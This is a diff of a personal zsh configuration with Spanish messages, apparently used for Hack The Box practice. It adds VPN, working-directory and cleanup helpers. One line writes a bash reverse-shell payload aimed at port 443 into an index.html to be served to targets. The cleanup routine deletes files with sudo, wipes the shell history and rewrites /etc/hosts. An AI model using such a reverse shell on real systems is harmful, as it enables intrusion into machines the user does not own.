@@ -1,9 +1,15 @@
 # Prompt
-# ADD as ~/.zshrc and change "kermit" with ur linux username
 PROMPT="%F{red}[%f%F{cyan}$USER%f%F{red}]─[%f%F{green}%d%f%F{red}]%f""%F{red}%(?..[%?])%f%F{yellow}$> %f"
 # Export PATH$
-export PATH=~/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:$PATH
+export PATH=/home/kermit/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kermit/.fzf/bin:/opt/exploitdb:PATH
 
+export ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt)
+export name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt)
+
+function xp()
+{
+  xclip -sel clip
+}
 
 function hex-encode()
 {
@@ -81,11 +87,14 @@ fondopurple="\e[0;46m\033[1m"
 fondogris="\e[0;47m\033[1m"
 
 function funciones(){
-  echo -e "\n\t${blue}[+]${endcolor} ${green}htbvpn${endcolor} Ejecuta la VPN descargada"
+  echo -e "\n\t${blue}[+]${endcolor} ${green}htbvpn${endcolor} Ejecuta la VPN descargada en ${red}/descargas/firefox${endcolor}"
   echo -e "\n\t${blue}[+]${endcolor} ${green}rmk${endcolor} Borra totalmente"
   echo -e "\n\t${blue}[+]${endcolor} ${green}scope${endcolor} Crea un target y directorios de trabajo"
-  echo -e "\n\t${blue}[+]${endcolor} ${green}finish${endcolor} Mata la VPN, sesion TMUX y borra directorios de trabjo" 
-  echo -e "\n\t${blue}[+]${endcolor} ${green}ports${endcolor} Muestra los puertos descubiertos de un archivo -oG de NMAP\n" 
+  echo -e "\n\t${blue}[+]${endcolor} ${green}finish${endcolor} Mata la VPN, sesion TMUX y borra directorios de trabajo" 
+  echo -e "\n\t${blue}[+]${endcolor} ${green}xp${endcolor} Copia en la clipboard, ${red}ctrl + shift + v${endcolor} para pegar" 
+  echo -e "\n\t${blue}[+]${endcolor} ${green}ports${endcolor} Muestra los puertos descubiertos de un archivo -oG de NMAP" 
+  echo -e "\n\t${blue}[+]${endcolor} ${green}rot13${endcolor} Rota todos los caracteres 13 posiciones\n" 
+
 }
 #funciones
 function htbvpn(){
@@ -124,15 +133,14 @@ if [ "$IFACE" = "tun0" ]; then
   htb_ip=$(/usr/sbin/ifconfig | grep tun0 -A1 | grep inet | awk '{print $2}')
   echo -ne "\n\n\t${green}[+]${endcolor} Conexion con VPN establecida"
   echo -ne "\n\n\t${green}[+]${endcolor} Ip de Hack the box: ${blue}$(/usr/sbin/ifconfig tun0 | grep "inet " | awk '{print $2}')${endcolor}"
-  #ip_address=$1
-  #nombre_maquina=$2
+  echo -ne "\n\n\t${green}[+]${endcolor} Ip target: ${red}$ip_address ${endcolor}"
+
   echo "$ip_address" > /home/kermit/.config/bin/target.txt
   echo "$nombre_maquina" > /home/kermit/.config/bin/name.txt
-  export ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt)
-  export name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt)
 
   echo "\n\n\t${green}[+]${endcolor} Creando directorios de trabajo..."
   mkdir /home/kermit/maquinas/$nombre_maquina
+  mkdir /home/kermit/maquinas/$nombre_maquina/content
   touch /home/kermit/maquinas/$nombre_maquina/scan
   touch /home/kermit/maquinas/$nombre_maquina/credentials
   touch /home/kermit/maquinas/$nombre_maquina/index.html
@@ -141,10 +149,12 @@ if [ "$IFACE" = "tun0" ]; then
   cd /home/kermit/maquinas/$nombre_maquina
   echo "\n"
   lsd -la
+  echo "\n\n"
   tput cnorm
 else
   echo "\n\n\t${red}[!]${endcolor} Error al crear index.html, ip de interfaz tun0 no disponible"
   echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
+  echo -ne "\n\n"
   tput cnorm
 fi
 }
@@ -168,27 +178,36 @@ tput civis
 rm -rf /home/kermit/Descargas/firefox/*
 echo -ne "\n\n\t${yellow}[$]${endcolor} Borrando descargas..."
 if [ -z "$(ls -A /home/kermit/Descargas/firefox/)" ]; then
-  echo "\n\n\t${blue}[+]${endcolor} Borrado correctamente"
+  echo "\n\n\t${blue}[+]${endcolor} Borradas correctamente"
 else
   echo "\n\n\t${red}[!]${endcolor} Error al borrar /Descargas/firefox"
 fi
 
+echo -ne "\n\t${blue}[+]${endcolor} Borrados archivos alterados"
+sudo rm -rf /home/kermit/maquinas/$nombre_maquina
 echo "" > /home/kermit/.zsh_history
 echo "" > /home/kermit/.config/bin/target.txt
 echo "" > /home/kermit/.config/bin/name.txt
+echo "# Host addresses" > /etc/hosts
+echo "#" >> /etc/hosts
+echo "127.0.0.1  localhost" >> /etc/hosts
+echo "127.0.1.1  parrot" >> /etc/hosts
+echo -ne "\n\n\n" >> /etc/hosts
+echo "::1        localhost ip6-localhost ip6-loopback" >> /etc/hosts
+echo "ff02::1    ip6-allnodes" >> /etc/hosts
+echo "ff02::2    ip6-allrouters" >> /etc/hosts
 tput cnorm
 
-# Matando la VPN
-echo "\n" 
-sudo /usr/bin/killall openvpn
+# Matando la VPN 
 echo -ne "\n\n\t${yellow}[$]${endcolor}Matando VPNs..."
-IFACE=$(/usr/sbin/ifconfig | grep tun0 | awk '{print $1}' | tr -d ':')
+sudo /usr/bin/killall openvpn &> /dev/null
+IFACE=$(/usr/sbin/ifconfig | grep tun0 | awk '{print $1}' | tr -d ':') &> /dev/null
 if [ "$IFACE" == "tun0" ]; then
   echo -ne "\n\n\t${blue}[!]${endcolor} Error al matar las VPNs"
 else
   echo -ne "\n\n\t${red}[+]${endcolor} VPNs finalizadas"
 fi
-
+echo -ne "\n\n"
 tput cnorm
 }
 
